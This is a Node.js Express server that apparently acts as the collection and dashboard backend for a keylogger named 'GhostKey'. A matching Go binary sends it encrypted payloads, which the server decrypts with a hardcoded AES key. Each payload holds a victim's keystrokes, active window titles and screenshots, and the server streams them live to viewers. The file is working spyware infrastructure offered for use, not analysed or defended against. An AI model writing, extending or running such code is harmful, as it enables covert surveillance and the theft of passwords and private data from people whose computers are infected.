const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const CryptoJS = require('crypto-js');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const AES_KEY = "x93mK!qWeR7zL9p&2vN8bT5cY4fU6jH0";  // ←←← SAME AS YOUR GO BINARY

app.use(cors());
app.use(bodyParser.json({ limit: '15mb' }));
app.use(express.static('public'));

// SSE clients array
const clients = [];

// SSE endpoint
app.get('/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');

  // Send a comment to keep connection open
  res.write(':ok\n\n');

  // Add client to list
  clients.push(res);

  // Remove client on close
  req.on('close', () => {
    const index = clients.indexOf(res);
    if (index !== -1) {
      clients.splice(index, 1);
    }
  });
});

// Broadcast function to send data to all clients
function broadcast(data) {
  clients.forEach((client) => {
    try {
      client.write(`data: ${JSON.stringify(data)}\n\n`);
    } catch (err) {
      // Ignore errors if client connection is closed
    }
  });
}

// decrypt (matches Go binary)
function decrypt(b64) {
  try {
    const bytes = CryptoJS.AES.decrypt(b64, AES_KEY);
    return JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
  } catch (e) {
    console.log("Decrypt failed");
    return null;
  }
}

// legacy browser logs
app.post('/log', (req, res) => res.json({ success: true }));

// native GhostKey logs
app.post('/ghost', (req, res) => {
  const payload = decrypt(req.body.data);
  if (payload) {
    console.log(`→ ${payload.client} | ${payload.win} | ${payload.keys.length} keys${payload.Screenshot ? ' + screenshot' : ''}`);
    // Broadcast the payload to SSE clients
    broadcast({ message: 'New ghost log', payload });
  }
  res.json({ success: true });
});

app.listen(PORT, () => {
  console.log(`Dashboard running → http://localhost:${PORT}`);
});